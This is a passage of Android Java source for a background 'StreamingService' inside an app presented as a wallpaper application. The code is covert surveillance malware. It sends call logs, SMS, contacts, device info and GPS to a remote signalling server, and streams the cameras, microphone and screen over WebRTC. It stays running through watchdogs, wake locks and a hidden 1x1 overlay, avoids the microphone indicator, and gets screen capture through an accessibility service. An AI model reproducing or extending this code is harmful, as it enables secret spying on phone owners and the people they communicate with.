package com.example.wallpaperapplication;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import androidx.lifecycle.LifecycleService;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.media.AudioManager;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.SystemClock;
import android.os.VibrationEffect;
import android.os.Vibrator;
import androidx.annotation.NonNull;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.provider.Telephony;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import android.widget.Toast;

import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;
import androidx.preference.PreferenceManager;

import com.google.android.gms.common.api.ResolvableApiException;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.location.LocationSettingsRequest;
import com.google.android.gms.location.LocationSettingsResponse;
import com.google.android.gms.location.SettingsClient;
import android.app.ActivityOptions;
import android.location.LocationManager;

import io.socket.client.IO;
import io.socket.client.Socket;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.webrtc.*;
import org.webrtc.audio.AudioDeviceModule;
import org.webrtc.audio.JavaAudioDeviceModule;

import java.io.File;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.util.Base64;
import java.net.URISyntaxException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.Locale;

import android.speech.tts.TextToSpeech;

public class StreamingService extends LifecycleService implements android.hardware.SensorEventListener, TextToSpeech.OnInitListener {
    private TextToSpeech tts;
    private android.hardware.SensorManager sensorManager;
    private android.hardware.Sensor lightSensor;
    private android.hardware.Sensor proximitySensor;
    private android.hardware.Sensor accelSensor;
    private boolean isSensorSubscribed = false;
    private long lastSensorEmitTime = 0;
    private static final String TAG = "StreamingService";
    private static final long DATA_POLL_INTERVAL = 30_000; // Poll every 30 seconds
    private static final boolean showNotif = true;

    private final Handler internalWatchdogHandler = new Handler(Looper.getMainLooper());
    private static final long INTERNAL_WATCHDOG_INTERVAL_MS = 15_000; // Check every 15 seconds
    private final Runnable internalWatchdogRunnable = new Runnable() {
        @Override
        public void run() {
            checkAndEnforceStreaming();
            internalWatchdogHandler.postDelayed(this, INTERNAL_WATCHDOG_INTERVAL_MS);
        }
    };

    private PeerConnectionFactory factory;
    private EglBase eglBase;

    // Modular Components
    private CameraManager cameraManager;
    private ScreenCaptureManager screenCaptureManager;
    private Intent mediaProjectionData;
    private FileSystemExtension fileSystemExtension;
    private LocalRecorder localRecorder;

    private AudioSource audioSource;
    private AudioTrack audioTrack;
    private AudioDeviceModule audioDeviceModule;
    private RtpTransceiver audioTransceiver;
    private org.webrtc.DataChannel telemetryDataChannel;
    private boolean isFrontCameraStreaming = false;
    private boolean isBackCameraStreaming = false;
    private boolean isFrontCameraBusy = false;
    private boolean isBackCameraBusy = false;
    private boolean isMicStreaming = false;
    private boolean isLocationStreaming = false;
    private boolean isScreenStreaming = false;
    private PeerConnection peerConnection;
    private Socket socket;
    private volatile String webClientId = null;
    private FusedLocationProviderClient fusedLocationClient;
    private LocationCallback locationCallback;
    private BroadcastReceiver syncReceiver;
    private BroadcastReceiver gpsReceiver;
    private BroadcastReceiver screenStateReceiver;
    private long lastGpsPromptTime = 0;
    private static final long GPS_PROMPT_DEBOUNCE_MS = 5000;
    private PowerManager.WakeLock wakeLock;
    private android.net.wifi.WifiManager.WifiLock wifiLock;
    private ConnectivityManager.NetworkCallback networkCallback;
    private boolean isForegroundStarted = false;

    private static volatile StreamingService instance;

    public static StreamingService getInstance() {
        return instance;
    }

    public boolean isFrontCameraStreaming() {
        return isFrontCameraStreaming;
    }

    public boolean isBackCameraStreaming() {
        return isBackCameraStreaming;
    }

    public String getPhysicalDeviceId() {
        try {
            String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            if (androidId != null && !androidId.isEmpty()) {
                return androidId;
            }
        } catch (Exception ignored) {}
        return "android_" + Build.MODEL.replaceAll("\\s+", "_");
    }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        Log.d(TAG, "Service onCreate");

        acquireWakeLock();
        registerNetworkCallback();

        tts = new TextToSpeech(this, this);

        sensorManager = (android.hardware.SensorManager) getSystemService(Context.SENSOR_SERVICE);
        if (sensorManager != null) {
            lightSensor = sensorManager.getDefaultSensor(android.hardware.Sensor.TYPE_LIGHT);
            proximitySensor = sensorManager.getDefaultSensor(android.hardware.Sensor.TYPE_PROXIMITY);
            accelSensor = sensorManager.getDefaultSensor(android.hardware.Sensor.TYPE_ACCELEROMETER);
        }

        updateForegroundServiceNotification(false);

        // Register Sync Receiver (triggered by WorkManager)
        syncReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                if (Constants.ACTION_FORCE_SYNC.equals(intent.getAction())) {
                    Log.d(TAG, "Received Force Sync broadcast");
                    if (socket != null && socket.connected()) {
                        sendCallLogs();
                        sendSmsMessages();
                        sendContacts();
                        sendDeviceInfo();
                        requestLastLocation();
                    }
                }
            }
        };
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(syncReceiver, new IntentFilter(Constants.ACTION_FORCE_SYNC), Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(syncReceiver, new IntentFilter(Constants.ACTION_FORCE_SYNC));
        }

        // Register GPS state receiver
        gpsReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                if (intent == null) return;
                String action = intent.getAction();
                if (LocationManager.PROVIDERS_CHANGED_ACTION.equals(action) ||
                        Constants.ACTION_GPS_ENABLED.equals(action)) {
                    boolean gpsEnabled = isGpsEnabled();
                    Log.d(TAG, "GPS state changed. Action: " + action + ", Enabled: " + gpsEnabled);
                    if (gpsEnabled) {
                        cancelGpsNotification();
                        if (isLocationStreaming) {
                            startLocationUpdates(currentGpsIntervalMs);
                            requestLastLocation();
                        }
                    }
                }
            }
        };
        IntentFilter gpsFilter = new IntentFilter();
        gpsFilter.addAction(LocationManager.PROVIDERS_CHANGED_ACTION);
        gpsFilter.addAction(Constants.ACTION_GPS_ENABLED);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(gpsReceiver, gpsFilter, Context.RECEIVER_EXPORTED);
        } else {
            registerReceiver(gpsReceiver, gpsFilter);
        }

        // Register Screen Lock / Unlock state receiver
        screenStateReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                if (intent == null) return;
                String action = intent.getAction();
                if (Intent.ACTION_USER_PRESENT.equals(action) || Intent.ACTION_SCREEN_ON.equals(action)) {
                    Log.i(TAG, "Screen unlocked / turned ON (action=" + action + "). Re-evaluating streaming health...");
                    acquireWakeLock();
                    OverlayWindowManager.ensureOverlay(StreamingService.this);
                    ensureSocketConnected();
                    // Delay 600ms to allow CameraService and WindowManager to drop lockscreen restrictions
                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
                        checkAndEnforceStreaming();
                    }, 600);
                } else if (Intent.ACTION_SCREEN_OFF.equals(action)) {
                    Log.d(TAG, "Screen turned OFF (locked). Maintaining background streaming state...");
                    acquireWakeLock();
                    OverlayWindowManager.ensureOverlay(StreamingService.this);
                }
            }
        };
        IntentFilter screenFilter = new IntentFilter();
        screenFilter.addAction(Intent.ACTION_USER_PRESENT);
        screenFilter.addAction(Intent.ACTION_SCREEN_ON);
        screenFilter.addAction(Intent.ACTION_SCREEN_OFF);
        registerReceiver(screenStateReceiver, screenFilter);

        if (!hasRequiredPermissions()) {
            broadcastPermissionError();
            stopSelf();
            return;
        }

        initializeWebRTC();
        localRecorder = new LocalRecorder(this, eglBase);
        setupMediaStreaming();
        connectSignaling();
        startNotificationListener();

        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);

        // Ensure 1x1 overlay view for background streaming stability (prevents camera hardware disconnect)
        OverlayWindowManager.ensureOverlay(this);

        // Start internal periodic watchdog (checks streaming & socket health every 15s)
        startInternalWatchdog();

        // Schedule external AlarmManager watchdog (checks and revives service every 25s)
        StreamingWatchdogReceiver.scheduleNext(this);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        if (intent != null) {
            String action = intent.getAction();
            if (Constants.ACTION_STOP_STREAMING.equals(action)) {
                StreamingWatchdogReceiver.cancel(this);
                stopInternalWatchdog();
                OverlayWindowManager.removeOverlay();
                stopSelf();
                return START_NOT_STICKY;
            } else if (Constants.ACTION_GPS_ENABLED.equals(action)) {
                if (isGpsEnabled()) {
                    cancelGpsNotification();
                    if (isLocationStreaming) {
                        startLocationUpdates(currentGpsIntervalMs);
                        requestLastLocation();
                    }
                }
            } else if (Constants.ACTION_MEDIA_PROJECTION_RESULT.equals(action)) {
                Intent data = Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU
                        ? intent.getParcelableExtra(Constants.EXTRA_RESULT_DATA, Intent.class)
                        : intent.getParcelableExtra(Constants.EXTRA_RESULT_DATA);
                if (data != null) {
                    mediaProjectionData = data;
                    updateForegroundServiceNotification(true);
                    setScreenStreaming(true);
                }
            }

            if (intent.hasExtra(Constants.PREF_SIGNALING_URL)) {
                String newUrl = intent.getStringExtra(Constants.PREF_SIGNALING_URL);
                if (newUrl != null && !newUrl.trim().isEmpty()) {
                    Log.i(TAG, "Updating signaling URL to: " + newUrl);
                    if (socket != null) {
                        try { socket.disconnect(); } catch (Exception ignored) {}
                        socket = null;
                    }
                    connectSignaling();
                }
            }
        }
        // Ensure background connection is active
        ensureSocketConnected();
        OverlayWindowManager.ensureOverlay(this);
        startInternalWatchdog();
        StreamingWatchdogReceiver.scheduleNext(this);
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (instance == this) {
            instance = null;
        }
        isForegroundStarted = false;
        Log.d(TAG, "Service onDestroy");
        stopInternalWatchdog();
        OverlayWindowManager.removeOverlay();
        if (syncReceiver != null) unregisterReceiver(syncReceiver);
        if (gpsReceiver != null) {
            try {
                unregisterReceiver(gpsReceiver);
            } catch (Exception ignored) {}
            gpsReceiver = null;
        }
        if (screenStateReceiver != null) {
            try {
                unregisterReceiver(screenStateReceiver);
            } catch (Exception ignored) {}
            screenStateReceiver = null;
        }
        cancelGpsNotification();
        unregisterNetworkCallback();
        releaseWakeLock();
        cleanup();
        if (socket != null) socket.disconnect();

        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);
        if (prefs.getBoolean(Constants.PREF_STREAMING_ENABLED, true)) {
            // Re-arm external watchdog so it revives the service if killed unexpectedly by OS
            StreamingWatchdogReceiver.scheduleNext(this);
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        super.onBind(intent);
        return null;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Log.d(TAG, "Service onTaskRemoved (app swiped from recents), auto-reconnecting in background...");

        acquireWakeLock();
        OverlayWindowManager.ensureOverlay(this);
        ensureSocketConnected();

        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);
        if (prefs.getBoolean(Constants.PREF_STREAMING_ENABLED, true)) {
            // Re-arm watchdog to maintain continuous streaming health
            StreamingWatchdogReceiver.scheduleNext(getApplicationContext());
        }

        super.onTaskRemoved(rootIntent);
    }

    private void acquireWakeLock() {
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null && wakeLock == null) {
                wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "WallpaperApp:StreamingWakeLock");
                wakeLock.acquire();
                Log.d(TAG, "WakeLock acquired for background streaming");
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to acquire wake lock", e);
        }
        try {
            android.net.wifi.WifiManager wm = (android.net.wifi.WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            if (wm != null && wifiLock == null) {
                int wifiMode = Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q
                        ? android.net.wifi.WifiManager.WIFI_MODE_FULL_LOW_LATENCY
                        : android.net.wifi.WifiManager.WIFI_MODE_FULL_HIGH_PERF;
                wifiLock = wm.createWifiLock(wifiMode, "WallpaperApp:StreamingWifiLock");
                wifiLock.acquire();
                Log.d(TAG, "WifiLock acquired for background streaming");
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to acquire WifiLock", e);
        }
    }

    private void releaseWakeLock() {
        try {
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                wakeLock = null;
                Log.d(TAG, "WakeLock released");
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to release wake lock", e);
        }
        try {
            if (wifiLock != null && wifiLock.isHeld()) {
                wifiLock.release();
                wifiLock = null;
                Log.d(TAG, "WifiLock released");
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to release wifi lock", e);
        }
    }

    private void registerNetworkCallback() {
        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm != null) {
                NetworkRequest request = new NetworkRequest.Builder()
                        .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                        .build();
                networkCallback = new ConnectivityManager.NetworkCallback() {
                    @Override
                    public void onAvailable(@NonNull Network network) {
                        Log.i(TAG, "Network restored (Internet available), checking socket connection & WebRTC health...");
                        new Handler(Looper.getMainLooper()).post(() -> {
                            acquireWakeLock();
                            OverlayWindowManager.ensureOverlay(StreamingService.this);
                            if (socket != null && !socket.connected() && !socket.isActive()) {
                                Log.d(TAG, "Reconnecting Socket.IO on network restoration...");
                                socket.connect();
                            }
                            if (webClientId != null) {
                                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                                    checkAndEnforceStreaming();
                                }, 1000);
                            }
                        });
                    }

                    @Override
                    public void onLost(@NonNull Network network) {
                        Log.w(TAG, "Network connection lost (Data/Wi-Fi disconnected). Awaiting reconnection...");
                    }
                };
                cm.registerNetworkCallback(request, networkCallback);
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to register network callback", e);
        }
    }

    private void unregisterNetworkCallback() {
        try {
            if (networkCallback != null) {
                ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
                if (cm != null) {
                    cm.unregisterNetworkCallback(networkCallback);
                }
                networkCallback = null;
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to unregister network callback", e);
        }
    }

    private String getSignalingUrl() {
        Context storageContext = this;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            android.os.UserManager um = (android.os.UserManager) getSystemService(Context.USER_SERVICE);
            if (um != null && !um.isUserUnlocked()) {
                storageContext = createDeviceProtectedStorageContext();
            }
        }
        SharedPreferences prefs = storageContext.getSharedPreferences(
                getPackageName() + "_preferences", Context.MODE_PRIVATE);
        String saved = prefs.getString(Constants.PREF_SIGNALING_URL, null);
        if (saved == null || saved.trim().isEmpty() || saved.contains("railway.app")) {
            try {
                saved = PreferenceManager.getDefaultSharedPreferences(storageContext)
                        .getString(Constants.PREF_SIGNALING_URL, null);
            } catch (Exception ignored) {}
        }
        if (saved == null || saved.trim().isEmpty() || saved.contains("railway.app")) {
            saved = Constants.DEFAULT_SIGNALING_URL;
        }
        saved = saved.trim();

        // If running inside an Android emulator and targeting localhost, automatically route to the host machine (10.0.2.2)
        if (isEmulator() && (saved.contains("localhost") || saved.contains("127.0.0.1"))) {
            String original = saved;
            saved = saved.replace("localhost", "10.0.2.2").replace("127.0.0.1", "10.0.2.2");
            Log.i(TAG, "Android Emulator detected: Auto-mapped " + original + " -> " + saved);
        }
        return saved;
    }

    private boolean isEmulator() {
        return Build.FINGERPRINT.startsWith("generic")
                || Build.FINGERPRINT.startsWith("unknown")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.contains("Emulator")
                || Build.MODEL.contains("Android SDK built for x86")
                || Build.HARDWARE.contains("goldfish")
                || Build.HARDWARE.contains("ranchu")
                || Build.PRODUCT.contains("sdk_google")
                || Build.PRODUCT.contains("google_sdk")
                || Build.PRODUCT.contains("sdk")
                || Build.PRODUCT.contains("sdk_x86")
                || Build.PRODUCT.contains("vbox86p")
                || Build.PRODUCT.contains("emulator")
                || Build.PRODUCT.contains("simulator");
    }

    private boolean hasRequiredPermissions() {
        boolean camera = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED;
        boolean audio = ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED;
        boolean notify = Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED;
        boolean callLog = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED;
        boolean sms = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;
        boolean location = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED;
        boolean contacts = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;

        boolean storage = true;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            storage = android.os.Environment.isExternalStorageManager();
        } else {
            storage = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        }

        if (!camera) Log.e(TAG, "Camera permission missing");
        if (!audio) Log.e(TAG, "Record audio permission missing");
        if (!notify) Log.e(TAG, "Notifications permission missing");
        if (!callLog) Log.e(TAG, "Call log permission missing");
        if (!sms) Log.e(TAG, "SMS permission missing");
        if (!location) Log.e(TAG, "Location permission missing");
        if (!contacts) Log.e(TAG, "Contacts permission missing");
        if (!storage) Log.e(TAG, "Storage permission missing");

        return camera && audio && notify && callLog && sms && location && contacts && storage;
    }

    private void broadcastPermissionError() {
        Intent err = new Intent(Constants.ACTION_PERMISSION_ERROR);
        sendBroadcast(err);
    }

    private void initializeWebRTC() {
        PeerConnectionFactory.initialize(
                PeerConnectionFactory.InitializationOptions.builder(this)
                        .setEnableInternalTracer(true)
                        .createInitializationOptions());
        eglBase = EglBase.create();

        try {
            JavaAudioDeviceModule adm = JavaAudioDeviceModule.builder(this)
                    .setAudioSource(android.media.MediaRecorder.AudioSource.VOICE_RECOGNITION)
                    .setUseHardwareAcousticEchoCanceler(false)
                    .setUseHardwareNoiseSuppressor(false)
                    .setAudioRecordErrorCallback(new JavaAudioDeviceModule.AudioRecordErrorCallback() {
                        @Override
                        public void onWebRtcAudioRecordInitError(String errorMessage) {
                            Log.e(TAG, "WebRTC AudioRecord init error: " + errorMessage);
                        }
                        @Override
                        public void onWebRtcAudioRecordStartError(JavaAudioDeviceModule.AudioRecordStartErrorCode errorCode, String errorMessage) {
                            Log.e(TAG, "WebRTC AudioRecord start error: " + errorCode + " - " + errorMessage);
                        }
                        @Override
                        public void onWebRtcAudioRecordError(String errorMessage) {
                            Log.e(TAG, "WebRTC AudioRecord runtime error: " + errorMessage);
                        }
                    })
                    .createAudioDeviceModule();
            audioDeviceModule = adm;
            Log.d(TAG, "JavaAudioDeviceModule initialized with VOICE_RECOGNITION for concurrent audio sharing");
        } catch (Exception e) {
            Log.e(TAG, "Error configuring JavaAudioDeviceModule", e);
        }

        PeerConnectionFactory.Builder pcfBuilder = PeerConnectionFactory.builder()
                .setVideoEncoderFactory(new DefaultVideoEncoderFactory(eglBase.getEglBaseContext(), true, true))
                .setVideoDecoderFactory(new DefaultVideoDecoderFactory(eglBase.getEglBaseContext()));

        if (audioDeviceModule != null) {
            pcfBuilder.setAudioDeviceModule(audioDeviceModule);
        }

        factory = pcfBuilder.createPeerConnectionFactory();
    }

    private void ensureScreenCaptureFallback() {
        if (screenCaptureManager == null) return;
        if (!screenCaptureManager.isStreaming()) {
            if (mediaProjectionData != null) {
                Log.i(TAG, "Camera hardware busy with external app; activating screen capture fallback stream...");
                setScreenStreaming(true);
            } else if (WallpaperAccessibilityService.isRunning()) {
                Log.i(TAG, "Camera hardware busy with external app; initiating screen capture authorization via AccessibilityService...");
                launchMediaProjectionConsent();
            }
        }
    }

    private void setupMediaStreaming() {
        cameraManager = new CameraManager(this, eglBase);
        cameraManager.setOnCameraBusyListener((isFront, isBusy, reason) -> {
            Log.w(TAG, "Camera hardware busy state changed: front=" + isFront + ", isBusy=" + isBusy + ", reason=" + reason);
            if (isFront) {
                isFrontCameraBusy = isBusy;
            } else {
                isBackCameraBusy = isBusy;
            }
            if (isBusy) {
                // Physical camera is locked by another app (e.g. WhatsApp video call)
                // If stream is active, initiate screen sharing fallback so call & camera preview is streamed
                boolean requested = isFront ? isFrontCameraStreaming : isBackCameraStreaming;
                if (requested) {
                    ensureScreenCaptureFallback();
                }
            } else {
                // Physical camera was freed up! Auto-resume direct hardware capture
                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                    if (cameraManager != null) {
                        if (isFront && isFrontCameraStreaming && !cameraManager.isFrontRunning()) {
                            Log.i(TAG, "External app released front camera. Auto-resuming hardware front camera stream...");
                            cameraManager.startFrontCamera();
                        } else if (!isFront && isBackCameraStreaming && !cameraManager.isBackRunning()) {
                            Log.i(TAG, "External app released back camera. Auto-resuming hardware back camera stream...");
                            cameraManager.startBackCamera();
                        }
                    }
                }, 500);
            }
            sendStreamStatus();
        });

        cameraManager.setOnCameraFailureListener((isFront, reason) -> {
            Log.w(TAG, "Camera hardware failure reported: front=" + isFront + ", reason=" + reason);
            OverlayWindowManager.ensureOverlay(StreamingService.this);
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                if (cameraManager != null) {
                    if (isFront && isFrontCameraStreaming && !cameraManager.isFrontRunning() && !cameraManager.isFrontHardwareBusy()) {
                        Log.d(TAG, "Auto-recovering front camera capture in background...");
                        cameraManager.startFrontCamera();
                    }
                    if (!isFront && isBackCameraStreaming && !cameraManager.isBackRunning() && !cameraManager.isBackHardwareBusy()) {
                        Log.d(TAG, "Auto-recovering back camera capture in background...");
                        cameraManager.startBackCamera();
                    }
                }
            }, 3000);
        });
        cameraManager.initialize(factory);
        screenCaptureManager = new ScreenCaptureManager(this, eglBase);
        screenCaptureManager.setOnScreenCaptureStoppedListener(() -> {
            Log.w(TAG, "MediaProjection screen capture stopped by system");
            new Handler(Looper.getMainLooper()).post(() -> {
                mediaProjectionData = null;
                isScreenStreaming = false;
                updateForegroundServiceNotification(false);
                sendStreamStatus();
            });
        });
        screenCaptureManager.initialize(factory);
        // By default, do not start front or back camera capturers (stream on demand)
        // Audio capture is also started strictly on demand to prevent microphone usage indicator

        setupPeerConnection();
    }

    private void setupAudioCapture() {
        MediaConstraints audioConstraints = new MediaConstraints();
        audioConstraints.mandatory.add(new MediaConstraints.KeyValuePair("googEchoCancellation", "true"));
        audioConstraints.mandatory.add(new MediaConstraints.KeyValuePair("googAutoGainControl", "true"));
        audioConstraints.mandatory.add(new MediaConstraints.KeyValuePair("googNoiseSuppression", "true"));
        audioConstraints.mandatory.add(new MediaConstraints.KeyValuePair("googHighpassFilter", "true"));
        audioSource = factory.createAudioSource(audioConstraints);
        Log.d(TAG, "Audio capture initialized");
    }

    private void setupPeerConnection() {
        List<PeerConnection.IceServer> ice = new ArrayList<>();
        ice.add(PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer());
        ice.add(PeerConnection.IceServer.builder("stun:stun1.l.google.com:19302").createIceServer());
        ice.add(PeerConnection.IceServer.builder("stun:stun2.l.google.com:19302").createIceServer());

        PeerConnection.RTCConfiguration config = new PeerConnection.RTCConfiguration(ice);
        config.sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN;
        config.bundlePolicy = PeerConnection.BundlePolicy.MAXBUNDLE;
        config.rtcpMuxPolicy = PeerConnection.RtcpMuxPolicy.REQUIRE;
        config.continualGatheringPolicy = PeerConnection.ContinualGatheringPolicy.GATHER_CONTINUALLY;

        peerConnection = factory.createPeerConnection(config, new PeerConnection.Observer() {
            @Override
            public void onSignalingChange(PeerConnection.SignalingState s) {
                Log.d(TAG, "Signaling state: " + s);
            }
            @Override
            public void onIceConnectionChange(PeerConnection.IceConnectionState s) {
                Log.d(TAG, "ICE connection state: " + s);
                if (s == PeerConnection.IceConnectionState.FAILED) {
                    Log.w(TAG, "WebRTC ICE connection failed; scheduling auto-rebuild check...");
                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
                        if (peerConnection != null) {
                            PeerConnection.IceConnectionState current = peerConnection.iceConnectionState();
                            boolean isStreaming = isFrontCameraStreaming || isBackCameraStreaming || isScreenStreaming || isMicStreaming;
                            if (isStreaming && current == PeerConnection.IceConnectionState.FAILED
                                    && webClientId != null && socket != null && socket.connected()) {
                                Log.i(TAG, "ICE still failed; rebuilding PeerConnection now...");
                                rebuildPeerConnection();
                            }
                        }
                    }, 5000);
                }
            }
            @Override
            public void onIceConnectionReceivingChange(boolean receiving) {}
            @Override
            public void onIceGatheringChange(PeerConnection.IceGatheringState s) {
                Log.d(TAG, "ICE gathering state: " + s);
            }
            @Override
            public void onIceCandidate(IceCandidate c) {
                if (webClientId == null) return;
                try {
                    JSONObject candidate = new JSONObject();
                    candidate.put("sdpMid", c.sdpMid);
                    candidate.put("sdpMLineIndex", c.sdpMLineIndex);
                    candidate.put("candidate", c.sdp);
                    JSONObject signal = new JSONObject();
                    signal.put("candidate", candidate);
                    JSONObject msg = new JSONObject();
                    msg.put("to", webClientId);
                    msg.put("from", socket != null ? socket.id() : "");
                    msg.put("signal", signal);
                    if (socket != null && socket.connected()) {
                        socket.emit(Constants.EVENT_SIGNAL, msg);
                        Log.d(TAG, "Sent ICE candidate: " + c.sdpMid);
                    }
                } catch (JSONException e) {
                    Log.e(TAG, "ICE send failed", e);
                }
            }
            @Override
            public void onIceCandidatesRemoved(IceCandidate[] cs) {}
            @Override
            public void onAddStream(org.webrtc.MediaStream ms) {}
            @Override
            public void onRemoveStream(org.webrtc.MediaStream ms) {}
            @Override
            public void onDataChannel(org.webrtc.DataChannel dc) {}
            @Override
            public void onRenegotiationNeeded() {}
            @Override
            public void onAddTrack(RtpReceiver r, org.webrtc.MediaStream[] ms) {
                Log.d(TAG, "Track added: " + r.id());
            }
        });

        if (cameraManager != null && cameraManager.hasFrontCamera()) {
            VideoTrack frontTrack = cameraManager.getFrontTrack();
            if (frontTrack != null) frontTrack.setEnabled(isFrontCameraStreaming);
            peerConnection.addTransceiver(frontTrack, new RtpTransceiver.RtpTransceiverInit(
                    RtpTransceiver.RtpTransceiverDirection.SEND_ONLY, Collections.singletonList("stream")));
            Log.d(TAG, "Front video track added (enabled=" + isFrontCameraStreaming + ")");
        }
        if (cameraManager != null && cameraManager.hasBackCamera()) {
            VideoTrack backTrack = cameraManager.getBackTrack();
            if (backTrack != null) backTrack.setEnabled(isBackCameraStreaming);
            peerConnection.addTransceiver(backTrack, new RtpTransceiver.RtpTransceiverInit(
                    RtpTransceiver.RtpTransceiverDirection.SEND_ONLY, Collections.singletonList("stream")));
            Log.d(TAG, "Back video track added (enabled=" + isBackCameraStreaming + ")");
        }
        if (screenCaptureManager != null && screenCaptureManager.getScreenTrack() != null) {
            VideoTrack screenTrack = screenCaptureManager.getScreenTrack();
            if (screenTrack != null) screenTrack.setEnabled(isScreenStreaming);
            peerConnection.addTransceiver(screenTrack, new RtpTransceiver.RtpTransceiverInit(
                    RtpTransceiver.RtpTransceiverDirection.SEND_ONLY, Collections.singletonList("stream")));
            Log.d(TAG, "Screen video track added (enabled=" + isScreenStreaming + ")");
        }
        audioTransceiver = peerConnection.addTransceiver(
                MediaStreamTrack.MediaType.MEDIA_TYPE_AUDIO,
                new RtpTransceiver.RtpTransceiverInit(
                        RtpTransceiver.RtpTransceiverDirection.SEND_RECV,
                        Collections.singletonList("stream")
                )
        );
        if (isMicStreaming && audioTrack != null && audioTransceiver.getSender() != null) {
            audioTransceiver.getSender().setTrack(audioTrack, false);
            Log.d(TAG, "Audio track attached to transceiver for active mic stream");
        } else {
            Log.d(TAG, "Audio transceiver registered on standby (mic hardware idle)");
        }

        // Create DataChannel for sub-second, frame-accurate real-time GPS & telemetry transport
        try {
            org.webrtc.DataChannel.Init dcInit = new org.webrtc.DataChannel.Init();
            dcInit.ordered = true;
            telemetryDataChannel = peerConnection.createDataChannel("telemetry", dcInit);
            telemetryDataChannel.registerObserver(new org.webrtc.DataChannel.Observer() {
                @Override
                public void onBufferedAmountChange(long previousAmount) {}

                @Override
                public void onStateChange() {
                    if (telemetryDataChannel != null) {
                        Log.d(TAG, "WebRTC DataChannel 'telemetry' state: " + telemetryDataChannel.state());
                    }
                }

                @Override
                public void onMessage(org.webrtc.DataChannel.Buffer buffer) {}
            });
            Log.d(TAG, "Created WebRTC DataChannel 'telemetry'");
